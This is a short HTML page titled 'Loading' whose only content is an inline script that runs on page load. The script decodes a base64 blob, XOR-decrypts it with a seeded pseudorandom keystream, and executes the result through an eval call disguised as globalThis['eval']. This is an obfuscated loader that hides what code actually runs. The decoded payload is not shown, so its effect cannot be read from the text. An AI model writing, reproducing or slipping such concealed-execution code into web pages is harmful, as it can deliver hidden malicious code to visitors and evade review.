<!DOCTYPE html>
<html><head><title>Loading</title></head>
<body>
<div id="app"></div>
<script>
var blob = "KzYxLzYxNj8+PAP8NR8sKhIP2wQw==";
var seed = 987654;
function rnd() { seed = (seed * 9301 + 49297) % 233280; return seed / 233280; }
var raw = atob(blob);
var out = "";
for (var i = 0; i < raw.length; i++) {
  var c = raw.charCodeAt(i);
  var k = Math.floor(rnd() * 256);
  out += String.fromCharCode(c ^ k);
}
var fn = 'eval';
globalThis[fn](out);
</script>
</body></html>
